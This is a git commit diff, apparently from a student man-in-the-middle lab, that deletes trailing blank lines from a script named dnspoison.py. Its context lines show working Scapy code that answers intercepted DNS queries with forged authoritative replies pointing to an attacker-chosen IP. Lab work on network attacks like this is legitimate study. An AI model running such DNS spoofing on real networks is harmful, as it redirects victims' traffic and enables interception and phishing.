08c739b91f7bec13387cd53829c8a93118bffefd
ninjawill543 <112950582+ninjawill543@users.noreply.github.com>
2022-11-13 19:56:04 +0100

    Update dnspoison.py

--- TP5-MITM/Scripts/dnspoison.py
+++ TP5-MITM/Scripts/dnspoison.py
@@ -19,10 +19,3 @@ while True:
     if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
         spoof = (Ether())/IP(dst=a[0].getlayer(IP).src, src=a[0].getlayer(IP).dst)/UDP(dport=a[0].getlayer(UDP).sport, sport=a[0].getlayer(UDP).dport)/DNS(id=a[0].getlayer(DNS).id, qd=a[0].getlayer(DNS).qd, aa = 1, qr=1,an=DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP))
         sendp(spoof, count=1)
-    
-
-
-    
-
-
-
